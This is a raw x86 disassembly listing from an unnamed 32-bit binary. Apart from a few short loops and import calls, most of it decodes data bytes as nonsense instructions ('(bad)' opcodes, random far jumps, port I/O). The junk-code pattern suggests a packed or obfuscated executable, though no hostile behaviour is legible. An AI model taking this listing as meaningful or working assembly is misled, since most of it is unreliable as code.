  41208a:	imul   edi,DWORD PTR [esi+0x0],0xfffffff7
  41208e:	add    BYTE PTR [edx+0x11],bl
  412091:	data16 jo 0x4120fa
  412094:	jns    0x412087
  412096:	fldenv [ebx+0x18879df7]
  41209c:	sub    eax,0xd9e4d78d
  4120a1:	je     0x4120f0
  4120a3:	mov    al,ds:0x26cb32ee
  4120a8:	call   0x8b496638
  4120ad:	add    BYTE PTR [ebx+0x41b2240d],cl
  4120b3:	add    BYTE PTR [ecx],al
  4120b5:	or     BYTE PTR [esi+0x5d],bl
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fd76
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fcd5
  4120d3:	adc    DWORD PTR ds:0x42e6ef,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e6eb,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e703,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e6fb,0x19
  412102:	cmp    DWORD PTR ds:0x42e6fb,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e6fb,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fd7e
  412121:	push   0x0
  412123:	push   0x42e26d
  412128:	call   DWORD PTR ds:0x42e483
  41212e:	mov    ebx,DWORD PTR ds:0x42e6fb
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e6fb,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e120,0x42fd01
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	adc    al,BYTE PTR [ebx+0x5f461263]
  412173:	jo     0x4121e5
  412175:	mov    ecx,0x8970707e
  41217a:	(bad)  
  41217b:	js     0x41219d
  41217d:	shr    BYTE PTR [edx+0x67],1
  412180:	inc    edx
  412181:	add    ch,ah
  412183:	cmp    BYTE PTR [esi+0x35],dh
  412186:	add    ebp,DWORD PTR [ebx-0x788ab12f]
  41218c:	popa   
  41218d:	loopne 0x41219c
  41218f:	aad    0x95
  412191:	es lahf 
  412193:	dec    ebp
  412194:	imul   esp,DWORD PTR [ebx],0x87cd491a
  41219a:	or     al,0xc4
  41219c:	push   esp
  41219d:	mov    ds:0x74cd5dad,al
  4121a2:	push   esi
  4121a3:	lods   eax,DWORD PTR ds:[esi]
  4121a4:	dec    esp
  4121a5:	sub    BYTE PTR [edi],cl
  4121a7:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4121a9:	or     eax,0x85419ffe
  4121ae:	pop    esp
  4121af:	push   0x79
  4121b1:	jge    0x41215a
  4121b3:	repnz inc esp
  4121b5:	mov    ecx,0x6b9182b
  4121ba:	scas   eax,DWORD PTR es:[edi]
  4121bb:	cmp    DWORD PTR [edi-0x7d],ebp
  4121be:	loope  0x412200
  4121c0:	jl     0x41220c
  4121c2:	mov    ah,0x93
  4121c4:	or     BYTE PTR [ebx],dh
  4121c6:	neg    DWORD PTR [esi+0x7d778b36]
  4121cc:	xor    eax,0x43727902
  4121d1:	sub    eax,0xa9029a8a
  4121d6:	xor    ecx,DWORD PTR [esi-0x22]
  4121d9:	push   ebp
  4121da:	sub    BYTE PTR [edi+0x58],dh
  4121dd:	push   edx
  4121de:	jmp    0x2a39:0x28e6fcbf
  4121e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121e6:	adc    al,BYTE PTR [ebp+0x22f3a5c6]
  4121ec:	ins    BYTE PTR es:[edi],dx
  4121ed:	dec    eax
  4121ee:	stos   BYTE PTR es:[edi],al
  4121ef:	les    edi,FWORD PTR [ecx-0x677e3cbf]
  4121f5:	inc    ebx
  4121f6:	cmp    bh,ah
  4121f8:	sbb    BYTE PTR [eax-0x23],0x21
  4121fc:	mov    ah,0xfd
  4121fe:	jne    0x41226f
  412200:	push   0x45
  412202:	xchg   esi,eax
  412203:	out    0xf6,al
  412205:	sub    bl,BYTE PTR [ebx+0x64]
  412208:	scas   eax,DWORD PTR es:[edi]
  412209:	sub    eax,0x73ac031c
  41220e:	mov    al,ds:0xd1404451
  412213:	inc    ebx
  412214:	jno    0x41226f
  412216:	repz xor eax,0xcaee2ba
  41221c:	ret    
  41221d:	(bad)  
  41221e:	sbb    al,0xc
  412220:	dec    edx
  412221:	xor    eax,0xaa8cb12c
  412226:	mov    edx,0x1b786812
  41222b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41222c:	adc    bl,BYTE PTR [ecx+0x40]
  41222f:	fiadd  DWORD PTR [edx-0x1b]
  412232:	loope  0x412266
  412234:	mov    edi,0xb662f610
  412239:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41223a:	scas   eax,DWORD PTR es:[edi]
  41223b:	call   0x4dd9:0x1dce945f
  412242:	jmp    0xf59a425d
  412247:	inc    esp
  412248:	cli    
  412249:	mov    ds:0xef5dd39a,eax
  41224e:	adc    BYTE PTR [esi],0x8c
  412251:	shr    DWORD PTR [ebx-0x3ed44343],0x12
  412258:	aaa    
  412259:	rcr    edi,cl
  41225b:	and    eax,0x4297eb03
  412260:	mov    esi,?
  412262:	sbb    al,0xd8
  412264:	dec    ebx
  412265:	sbb    ch,bh
  412267:	stos   BYTE PTR es:[edi],al
  412268:	imul   edx,DWORD PTR [edi+0x7cc65bcb],0x5b
  41226f:	pop    eax
  412270:	xchg   edx,eax
  412271:	mov    ds:0x4c8318a3,al
  412276:	cdq    
  412277:	xor    esi,DWORD PTR [esi-0x7390a0b]
  41227d:	add    al,0x3e
  412280:	gs xabort 0x4c
  412284:	loope  0x41220c
  412286:	ds pop ds
  412288:	popf   
  412289:	shr    DWORD PTR [ecx],cl
  41228b:	cdq    
  41228c:	push   es
  41228d:	xchg   ebx,eax
  41228e:	push   edx
  41228f:	jbe    0x4122df
  412291:	stc    
  412292:	cmp    DWORD PTR ds:0x5b407024,ebx
  412298:	sub    ebx,0x46
  41229b:	mov    edx,0x238ddbf8
  4122a0:	pop    edx
  4122a1:	inc    ebp
  4122a2:	call   0x2f89:0xfc192dcb
  4122a9:	out    dx,al
  4122aa:	ret    
  4122ab:	(bad)  
  4122ac:	jne    0x41230b
  4122ae:	fbstp  TBYTE PTR [edx+0x1e]
  4122b1:	jl     0x412249
  4122b3:	dec    ecx
  4122b4:	(bad)  
  4122b5:	jbe    0x41228b
  4122b7:	pop    ss
  4122b8:	int    0xae
  4122ba:	cmp    cl,BYTE PTR [edi-0x1812f8e3]
  4122c0:	mov    ebp,0x33dfc018
  4122c5:	pop    eax
  4122c6:	ds mov bh,0xba
  4122c9:	icebp  
  4122ca:	out    0x10,al
  4122cc:	inc    esi
  4122cd:	enter  0x7997,0x8d
  4122d1:	cmp    esi,eax
  4122d3:	fcom   QWORD PTR [edi]
  4122d5:	mov    edx,0x7c797c6b
  4122da:	and    esi,DWORD PTR [edx]
  4122dc:	leave  
  4122dd:	sub    edi,DWORD PTR [ebx+0x6877d532]
  4122e3:	aas    
  4122e4:	repnz stos DWORD PTR es:[edi],eax
  4122e6:	out    0xf6,al
  4122e8:	pop    ebx
  4122e9:	and    edi,DWORD PTR [edi+0x4605b769]
  4122ef:	mov    ebx,0xd65f6e5
  4122f4:	rol    DWORD PTR [esi-0x37],1
  4122f7:	push   0x8cf12d4e
  4122fc:	xchg   edi,eax
  4122fd:	out    0x34,al
  4122ff:	fist   WORD PTR [edx-0x7b210847]
  412305:	lods   eax,DWORD PTR ds:[esi]
  412306:	jp     0x412302
  412308:	pop    ss
  412309:	not    DWORD PTR [ecx-0x22bff45d]
  41230f:	(bad)  [edx+0x5b]
  412312:	iret   
  412313:	cmp    ah,BYTE PTR [ecx-0x2e9e95da]
  412319:	(bad)  
  41231a:	into   
  41231b:	mov    eax,ds:0x4523693c
  412320:	xor    eax,0x1576ee65
  412325:	or     bl,0xe9
  412328:	jg     0x41235c
  41232a:	jmp    0x520f:0x57a88723
  412331:	rol    BYTE PTR [esp+ebp*4-0x282b4a74],cl
  412338:	imul   esp,DWORD PTR [esi],0x39
  41233b:	das    
  41233c:	retf   
  41233d:	loop   0x4122ec
  41233f:	dec    esp
  412340:	out    0x25,al
  412342:	div    ebp
  412344:	xchg   esp,eax
  412345:	je     0x412385
  412347:	xor    BYTE PTR [ecx-0x10],cl
  41234a:	int    0xc8
  41234c:	retf   
  41234d:	jno    0x4123b2
  41234f:	rol    BYTE PTR [ecx+0x3f],cl
  412352:	ins    BYTE PTR es:[edi],dx
  412353:	jmp    0xb8a5:0xc3ce19fa
  41235a:	xor    ch,BYTE PTR [edx]
  41235c:	mov    dh,0x85
  41235e:	loope  0x41232d
  412360:	inc    esp
  412361:	cmp    DWORD PTR [esi+0x4fca2f8e],0x42
  412368:	mov    edi,0xd67ec290
  41236d:	jmp    0x4123d9
  41236f:	dec    esp
  412370:	mov    al,ds:0x7e3da64d
  412375:	loope  0x412338
  412377:	ins    BYTE PTR es:[edi],dx
  412378:	pop    ss
  412379:	add    al,0xad
  41237b:	xchg   BYTE PTR ds:0x7bfc270,dh
  412381:	push   edx
  412382:	adc    BYTE PTR [esp+esi*1-0x2c43a064],dl
  412389:	mov    al,ds:0xc79a47e1
  41238e:	adc    dl,BYTE PTR [edx+0x59]
  412391:	sbb    al,0x17
  412393:	sbb    al,0x22
  412395:	fisttp QWORD PTR [edx-0xebea068]
  41239b:	jge    0x4123c4
  41239d:	or     dl,BYTE PTR [ebx]
  41239f:	(bad)
  4123a2:	shr    DWORD PTR [eax+ebp*1-0x424c5f10],cl
  4123a9:	inc    esi
  4123aa:	add    BYTE PTR [edx+ebp*4+0x4ec2ced1],dl
  4123b1:	sub    BYTE PTR ds:[ecx+0x69a3f194],dl
  4123b8:	pop    es
  4123b9:	jl     0x412393
  4123bb:	scas   eax,DWORD PTR es:[edi]
  4123bc:	into   
  4123bd:	cmp    edx,DWORD PTR [ebp+0xf]
  4123c0:	into   
  4123c1:	je     0x4123f1
  4123c3:	mov    edi,0x5af49e9c
  4123c8:	ret    
  4123c9:	add    al,0x62
  4123cb:	xor    BYTE PTR [ebp+0x15],bh
  4123ce:	and    BYTE PTR [eax],ah
  4123d0:	daa    
  4123d1:	addr16 ret 
  4123d3:	jp     0x4123aa
  4123d5:	xchg   BYTE PTR ds:0xaaf9d495,al
  4123db:	cmp    DWORD PTR [edx],esi
  4123dd:	retf   
  4123de:	adc    esp,DWORD PTR [esi-0x6a5894d9]
  4123e4:	and    BYTE PTR [ecx+ebp*1+0x2e],0x3
  4123e9:	inc    ebp
  4123ea:	ss (bad) 
  4123ec:	stos   DWORD PTR es:[edi],eax
  4123ed:	push   cs
  4123ee:	sbb    DWORD PTR [ebx+0x2011f12d],edx
  4123f4:	add    cl,BYTE PTR [ebp-0x8]
  4123f7:	jmp    DWORD PTR [ebx+0x3820c226]
  4123fd:	and    BYTE PTR [ebp-0x42783d39],bh
  412403:	pop    ebx
  412405:	or     ecx,DWORD PTR [ecx-0x17]
  412408:	sbb    ecx,DWORD PTR [ebx+0x9]
  41240b:	jp     0x4123f0
  41240d:	mov    bl,BYTE PTR [edi]
  41240f:	jno    0x41241b
  412411:	cdq    
  412412:	fimul  WORD PTR [ebp+0x35]
  412415:	hlt    
  412416:	call   0x242bdc43
  41241b:	mov    ecx,0xafa1d1bb
  412420:	arpl   WORD PTR [ecx-0x75],dx
  412423:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412424:	xchg   ecx,eax
  412425:	mov    DWORD PTR [edx-0x59],ebx
  412428:	call   0xd5ca:0x15311ac6
  41242f:	js     0x412463
  412431:	(bad)  
  412432:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412433:	(bad)
  412437:	inc    ebx
  412438:	pop    esi
  412439:	mov    ch,0x2c
  41243b:	jp     0x4124af
  41243d:	cmp    dh,BYTE PTR [ebx-0x7e34fc87]
  412443:	sub    eax,0x42fcf9
  412448:	xchg   esi,eax
  412449:	sldt   WORD PTR [eax]
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	push   ebp
  41245e:	aaa    
  41245f:	inc    ebx
  412460:	addr16 (bad) 
  412462:	pop    esp
  412463:	jo     0x4124d5
  412465:	mov    ecx,0x8c70707e
  41246a:	retf   0x996f
  41246d:	cmp    al,0xc5
  41246f:	inc    esp
  412470:	push   esi
  412471:	dec    eax
  412472:	mov    WORD PTR [eax+eax*8+0x3c0a9f86],ds
  412479:	jge    0x4124d7
  41247b:	pushf  
  41247c:	dec    esp
  41247d:	and    DWORD PTR [edx],edx
  41247f:	xchg   esp,eax
  412480:	ret    
  412481:	cmp    dh,BYTE PTR [ecx+0x5693631d]
  412487:	pop    edi
  412488:	inc    esi
  412489:	sti    
  41248a:	(bad)  
  41248b:	fst    DWORD PTR [edi]
  41248d:	stc    
  41248e:	cmp    eax,0xa1ac1e38
  412493:	je     0x41244c
  412495:	mov    BYTE PTR [ebp-0x675b357c],ch
  41249b:	repnz inc ecx
  41249d:	xchg   ebp,eax
  41249e:	stc    
  41249f:	(bad)  
  4124a0:	push   es
  4124a1:	int    0x87
  4124a3:	fld    QWORD PTR [ecx+0x3b]
  4124a6:	jl     0x412492
  4124a8:	pop    ds
  4124a9:	push   esp
  4124aa:	jmp    0x246b7353
  4124af:	cmc    
  4124b0:	inc    edx
  4124b1:	inc    ecx
  4124b2:	scas   eax,DWORD PTR es:[edi]
  4124b3:	mov    edx,0x5bec20b3
  4124b8:	mov    DWORD PTR [ecx],ebx
  4124ba:	mov    esi,0x678ba71
  4124bf:	pop    esi
  4124c0:	add    DWORD PTR [ebp+0x3e468c9a],0xfffffff7
  4124c7:	inc    esp
  4124c8:	out    0x67,al
  4124ca:	sar    DWORD PTR [esi+0x1e590f9e],1
  4124d0:	mov    cl,0x37
  4124d2:	sbb    al,0xc7
  4124d4:	ret    0xaf90
  4124d7:	add    DWORD PTR [ecx-0x38],ecx
  4124da:	inc    eax
  4124db:	sub    DWORD PTR [edi],0xc09bfe6b
  4124e1:	add    al,BYTE PTR [edi+0x4fa81ca2]
  4124e7:	pop    esp
  4124e8:	lea    si,[ebx]
  4124eb:	add    eax,edx
  4124ed:	retf   
  4124ee:	mov    ebp,0x5f8921b9
  4124f3:	add    esi,DWORD PTR [ecx-0x23daa06d]
  4124f9:	adc    BYTE PTR [eax+0x7b],al
  4124fc:	ficomp DWORD PTR [ebx]
  4124fe:	fmul   QWORD PTR [ebp+0x39]
  412501:	pop    esi
  412502:	mov    al,0x1c
  412504:	ss aam 0xc8
  412507:	dec    esi
  412508:	push   ds
  412509:	mov    ch,BYTE PTR [ebx]
  41250b:	xchg   esp,eax
  41250c:	sub    cl,0x24
  41250f:	pop    ecx
  412510:	js     0x4124a7
  412512:	or     DWORD PTR [ebx+0x3c17a740],0x896d981c
  41251c:	arpl   WORD PTR [edx-0x6d],bx
  41251f:	imul   eax,DWORD PTR [edx+0x41],0xfa5ee62d
  412526:	fisubr WORD PTR [ebx]
  412528:	add    eax,0xe2fff6a0
  41252d:	inc    ecx
  41252e:	jmp    0xdc07:0x7e1e0440
  412535:	clc    
  412536:	in     al,dx
  412537:	adc    BYTE PTR [ebx+0x6191e582],al
  41253d:	pop    es
  41253e:	xor    esi,eax
  412540:	pop    esi
  412541:	icebp  
  412542:	mov    ebx,0x970ddfa9
  412547:	es out 0x52,al
  41254a:	cmp    esi,DWORD PTR [esi-0x73]
  41254d:	fs pop edx
  41254f:	inc    edx
  412550:	mov    dl,0x81
  412552:	pushf  
  412553:	test   DWORD PTR [eax+ebp*4],edx
  412556:	ins    BYTE PTR es:[edi],dx
  412557:	in     eax,0xd9
  412559:	mov    ebx,0x61ed1009
  41255e:	test   eax,0xac6b160f
  412563:	bound  eax,QWORD PTR [esi-0x4dcdbb18]
  412569:	outs   dx,BYTE PTR ds:[esi]
  41256a:	push   ecx
  41256b:	cmp    al,bl
  41256d:	or     bh,BYTE PTR [ecx]
  41256f:	clc    
  412570:	in     al,0x78
  412572:	leave  
  412573:	sahf   
  412574:	xor    DWORD PTR [edi+0x3cb1be83],esi
  41257a:	out    0x3c,eax
  41257c:	xchg   edx,eax
  41257d:	pushf  
  41257e:	push   esi
  41257f:	pop    ebx
  412580:	retf   0x76c
  412583:	stc    
  412584:	inc    edx
  412585:	jne    0x412534
  412587:	repnz mov edx,0x831648b8
  41258d:	adc    DWORD PTR [ecx],0x1adefdcc
  412593:	mov    ds:0xad03f125,al
  412598:	jmp    0x412563
  41259a:	ss call 0x51ee:0x978133c3
  4125a2:	jnp    0x412532
  4125a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125a5:	stos   DWORD PTR es:[edi],eax
  4125a6:	or     BYTE PTR [esi+0x21],0xcf
  4125aa:	xor    DWORD PTR [eax-0x38],edx
  4125ad:	mov    eax,0x592220f8
  4125b2:	pushw  es
  4125b4:	mov    esi,ebx
  4125b6:	xchg   ebp,eax
  4125b7:	mov    es,ecx
  4125b9:	lds    eax,FWORD PTR [esp+eiz*4-0x18373849]
  4125c0:	nop
  4125c1:	pop    edx
  4125c2:	pusha  
  4125c3:	outs   dx,BYTE PTR ds:[esi]
  4125c4:	out    0x7b,al
  4125c6:	popf   
  4125c7:	lods   al,BYTE PTR ds:[esi]
  4125c8:	or     al,0x10
  4125ca:	cmp    DWORD PTR [ebp-0x4233bbf8],esi
  4125d0:	retf   
  4125d1:	repz and DWORD PTR [esi],ebx
  4125d4:	and    al,0xc7
  4125d6:	jns    0x4125fc
  4125d8:	jno    0x41261c
  4125da:	add    eax,0xb2a8d172
  4125df:	fist   WORD PTR [ecx-0x2]
  4125e2:	arpl   WORD PTR [esi+ecx*4+0x1c],dx
  4125e6:	or     al,0x72
  4125e8:	push   ds
  4125e9:	repnz outs dx,DWORD PTR ds:[esi]
  4125eb:	push   eax
  4125ec:	dec    eax
  4125ed:	pop    es
  4125ee:	rcr    BYTE PTR [ebp+edx*1+0x15],1
  4125f2:	push   ebp
  4125f3:	sbb    eax,0x5b1dcb65
  4125f8:	cmp    dl,ch
  4125fa:	adc    al,0x52
  4125fc:	out    0x97,al
  4125fe:	inc    eax
  4125ff:	sub    DWORD PTR ds:0x41827e16,0xffffffbf
  412606:	frstor [edx-0x5c3ac64f]
  41260c:	sub    BYTE PTR [esi],dh
  41260e:	inc    ebp
  41260f:	dec    ecx
  412610:	inc    ebp
  412611:	and    al,0x38
  412613:	and    al,BYTE PTR ds:0xf3308104
  412619:	pop    ebx
  41261a:	imul   ebx,DWORD PTR [ebx+0x1c],0x5f
  41261e:	(bad)  
  41261f:	push   ecx
  412620:	inc    ebx
  412621:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412622:	sub    esi,DWORD PTR [esi+0x21]
  412625:	fwait
  412626:	rol    BYTE PTR ds:0xdeafbd1,0x4b
  41262e:	jmp    0x41269a
  412630:	pop    ebx
  412631:	mov    ebx,0xd8549fac
  412636:	dec    edx
  412637:	les    ebx,FWORD PTR [edx]
  412639:	mov    ch,al
  41263b:	aad    0x12
  41263d:	test   DWORD PTR [edx+ebx*4-0x34],0x8f2619d8
  412645:	and    DWORD PTR [edx-0x4cf44b94],ecx
  41264b:	push   edi
  41264c:	pusha  
  41264d:	test   DWORD PTR es:[esi-0x4a9a8d09],0xe2180a60
  412658:	cmp    eax,0x7ca9ac83
  41265d:	mov    ds:0x5eeb1994,al
  412662:	pop    es
  412663:	stos   DWORD PTR es:[edi],eax
  412664:	(bad)  
  412665:	mov    al,ds:0xc8d1ee26
  41266a:	mov    ch,0x1
  41266c:	xchg   edi,eax
  41266d:	int3   
  41266e:	inc    esi
  41266f:	cmp    al,0xbc
  412671:	int3   
  412672:	call   0x7cdc:0x82c8b5b9
  412679:	jne    0x4126bb
  41267b:	xchg   edx,eax
  41267c:	cmp    al,0x8a
  41267e:	dec    esp
  41267f:	sbb    edi,DWORD PTR [edi+0x2d]
  412682:	adc    ebx,ecx
  412684:	(bad)  
  412685:	mov    al,ds:0x32f0afb1
  41268a:	icebp  
  41268b:	sbb    esi,DWORD PTR [edx+0x33e4ad53]
  412691:	dec    ebx
  412692:	imul   esp,DWORD PTR ds:0xf3eba923,0x4b
  412699:	push   0xe2bf95ea
  41269e:	pop    ebp
  41269f:	fwait
  4126a0:	dec    esi
  4126a1:	push   ebp
  4126a2:	push   es
  4126a3:	out    dx,eax
  4126a4:	add    al,BYTE PTR ds:0xead3970f
  4126aa:	or     DWORD PTR [ebp+ecx*2+0x492ed13b],esp
  4126b1:	(bad)  
  4126b2:	shl    DWORD PTR [edi+0x51],1
  4126b5:	mov    DWORD PTR [eax],esi
  4126b7:	int3   
  4126b8:	lahf   
  4126b9:	in     al,dx
  4126ba:	xor    ebp,DWORD PTR [ecx+0x3a5d1975]
  4126c0:	pop    eax
  4126c1:	mov    ?,WORD PTR [esi+edx*2]
  4126c4:	jne    0x4126fb
  4126c6:	in     eax,0x88
  4126c8:	je     0x4126cd
  4126ca:	hlt    
  4126cb:	pop    ds
  4126cc:	mov    al,ds:0xc4b4ca00
  4126d1:	loop   0x412662
  4126d3:	ret    0x1fee
  4126d6:	dec    ecx
  4126d7:	inc    eax
  4126d8:	cli    
  4126d9:	adc    DWORD PTR [eax],0x21
  4126dc:	mov    al,ds:0x221be2c1
  4126e1:	lds    edi,FWORD PTR [ecx]
  4126e3:	stos   DWORD PTR es:[edi],eax
  4126e4:	jle    0x412737
  4126e6:	mov    esi,0xb3c132de
  4126eb:	sbb    al,0x97
  4126ed:	loop   0x4126dc
  4126ef:	sbb    ebx,DWORD PTR [edi-0x3d]
  4126f2:	stos   DWORD PTR es:[edi],eax
  4126f3:	dec    ebp
  4126f4:	nop
  4126f5:	inc    edi
  4126f6:	les    ebx,FWORD PTR [esi-0x77]
  4126f9:	inc    ecx
  4126fa:	adc    BYTE PTR ds:0xa0461a3d,dh
  412700:	cmp    DWORD PTR cs:[ebx],edi
  412703:	psubq  mm4,QWORD PTR [esi]
  412706:	out    0x1e,al
  412708:	fld    QWORD PTR [edx]
  41270a:	or     eax,0xa3d8cd10
  41270f:	pop    edx
  412710:	pushf  
  412711:	or     al,0x35
  412713:	int    0x24
  412715:	scas   al,BYTE PTR es:[edi]
  412716:	sub    BYTE PTR [edx+0x7c2a74fa],dl
  41271c:	sbb    edx,ebx
  41271e:	and    al,0x46
  412720:	inc    edi
  412721:	test   DWORD PTR [esi],ecx
  412723:	fnstcw WORD PTR [eax+edi*4]
  412726:	jne    0x4126cd
  412728:	ffree  st(1)
  41272a:	adc    ebx,esi
  41272c:	adc    bh,BYTE PTR [esi+0x4d898d57]
  412732:	in     al,0x81
  412734:	and    eax,0x42fd76
  412739:	add    BYTE PTR [eax],al
  41273b:	add    BYTE PTR [eax],al
  41273d:	jmp    0x412751
  412742:	xor    ecx,ecx
  412744:	or     ecx,DWORD PTR ds:0x42fd76
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fd76,ecx
  412751:	cmp    DWORD PTR ds:0x42fd76,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fd76,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e313
  41277c:	cmp    DWORD PTR ds:0x42fd76,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fd76
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fd76,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fd6e,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    edi,DWORD PTR [esi]
  4127be:	push   0xfffffff0
  4127c0:	push   0xffffffc8
  4127c2:	pop    ecx
  4127c3:	jo     0x412835
  4127c5:	mov    ecx,0xb170707e
  4127ca:	jmp    0x76f6:0x58c52f40
  4127d1:	inc    ebp
  4127d2:	sahf   
  4127d3:	dec    ebp
  4127d4:	dec    esp
  4127d5:	loop   0x41279b
  4127d7:	in     eax,dx
  4127d8:	dec    edx
  4127d9:	scas   eax,DWORD PTR es:[edi]
  4127da:	mov    ah,0xb6
  4127dc:	xor    DWORD PTR [edi-0x73],ebx
  4127df:	pop    edi
  4127e0:	in     eax,dx
  4127e1:	imul   eax,DWORD PTR [ebp+0x25],0x13010767
  4127e8:	lock int 0xbf
  4127eb:	cmp    dl,BYTE PTR [ebx+ebp*8]
  4127ee:	push   esp
  4127ef:	xor    al,0xf
  4127f1:	loop   0x412861
  4127f3:	aad    0x75
  4127f5:	popa   
  4127f6:	mov    ebx,0x3e5c57bd
  4127fb:	aaa    
  4127fc:	and    ecx,DWORD PTR [eax-0x7025ff49]
  412802:	scas   al,BYTE PTR es:[edi]
  412803:	jbe    0x4127e8
  412805:	jnp    0x412886
  412807:	(bad)  
  412809:	test   DWORD PTR [eax],edi
  41280b:	xlat   BYTE PTR ds:[ebx]
  41280c:	mov    ds:0x3425a983,al
  412811:	scas   eax,DWORD PTR es:[edi]
  412812:	and    dh,cl
  412814:	mov    DWORD PTR [ecx+0x703ac577],0x5fe6a2f8
  41281e:	in     al,0xfa
  412820:	jmp    0xfa1:0x83f6b452
  412827:	mov    ?,WORD PTR [eax+0x3f]
  41282a:	rol    DWORD PTR [ecx-0x5db02e4f],1
  412830:	(bad)  
  412831:	gs push 0xffffff80
  412834:	xchg   esp,eax
  412835:	das    
  412836:	mov    ds:0xa3df6048,al
  41283b:	add    al,0xf8
  41283d:	cmp    BYTE PTR [eax+0x36],0x3e
  412841:	pop    es
  412842:	popa   
  412843:	sti    
  412844:	jne    0x412833
  412846:	sbb    ch,BYTE PTR [ebp+0x7ea68b9a]
  41284c:	int3   
  41284d:	pop    esi
  41284e:	push   edi
  41284f:	aas    
  412850:	xchg   edx,eax
  412851:	and    al,0x89
  412853:	xchg   esp,eax
  412854:	cdq    
  412855:	stc    
  412856:	add    ch,BYTE PTR [ebp-0x47]
  412859:	pop    eax
  41285a:	mov    ch,0x11
  41285c:	jp     0x412851
  41285e:	mov    ds:0x582fe4a8,al
  412863:	into   
  412864:	int3   
  412865:	(bad)  
  412866:	lds    esp,FWORD PTR [edx]
  412868:	aas    
  412869:	jbe    0x4128aa
  41286b:	mov    eax,0x65c3c2b1
  412870:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412871:	pop    ebx
  412872:	pavgw  mm0,QWORD PTR [esi]
  412875:	ins    DWORD PTR es:[edi],dx
  412876:	test   eax,0xb3fc951b
  41287b:	(bad)  
  41287c:	cli    
  41287d:	test   BYTE PTR [esi-0x1234ec27],0x82
  412884:	loop   0x4128aa
  412886:	adc    DWORD PTR [ebx],ebp
  412888:	add    BYTE PTR [eax],0x18
  41288b:	jg     0x4128e9
  41288d:	fwait
  41288e:	xchg   DWORD PTR [edx+0x7e8e57dc],ecx
  412894:	jns    0x4128e6
  412896:	inc    ebp
  412897:	pop    ds
  412898:	mov    ch,0xc3
  41289a:	push   edi
  41289b:	retf   0xb984
  41289e:	imul   DWORD PTR [ebp+0x70]
  4128a1:	test   eax,0x20124617
  4128a6:	jmp    0x5d4d:0xae8bd040
  4128ad:	xchg   ebp,eax
  4128ae:	mov    eax,0x285b163f
  4128b3:	into   
  4128b4:	mov    ds:0x8ce6b363,al
  4128b9:	addr16 pop edx
  4128bb:	leave  
  4128bc:	sbb    al,0xf5
  4128be:	mov    cl,0x7e
  4128c0:	jbe    0x412934
  4128c2:	nop
  4128c3:	or     DWORD PTR [ecx+0x7e],edi
  4128c6:	push   cs
  4128c7:	xchg   edi,eax
  4128c8:	dec    eax
  4128c9:	cmp    ebx,DWORD PTR [ecx+esi*4-0x3c]
  4128cd:	mov    dl,0xfc
  4128cf:	add    BYTE PTR [edx],bh
  4128d1:	pop    ecx
  4128d2:	push   ebx
  4128d3:	jno    0x412875
  4128d5:	in     al,0xa6
  4128d7:	stos   DWORD PTR es:[edi],eax
  4128d8:	loop   0x412911
  4128da:	cmp    DWORD PTR [eax+edx*2],esi
  4128dd:	mov    esi,0xce89edf1
  4128e2:	jl     0x4128d9
  4128e4:	test   al,0x33
  4128e6:	pushf  
  4128e7:	push   ecx
  4128e8:	sub    dh,BYTE PTR [edi-0x8]
  4128eb:	ins    BYTE PTR es:[edi],dx
  4128ec:	jl     0x412892
  4128ee:	nop
  4128ef:	inc    edx
  4128f0:	dec    ecx
  4128f1:	ret    
  4128f2:	ins    BYTE PTR es:[edi],dx
  4128f3:	(bad)  
  4128f4:	fcomp  QWORD PTR [eax]
  4128f6:	lahf   
  4128f7:	push   0x47
  4128f9:	out    0xbe,al
  4128fb:	or     al,0x1d
  4128fd:	and    ecx,0x258c661f
  412903:	mov    dl,bl
  412905:	dec    ecx
  412906:	pop    ebp
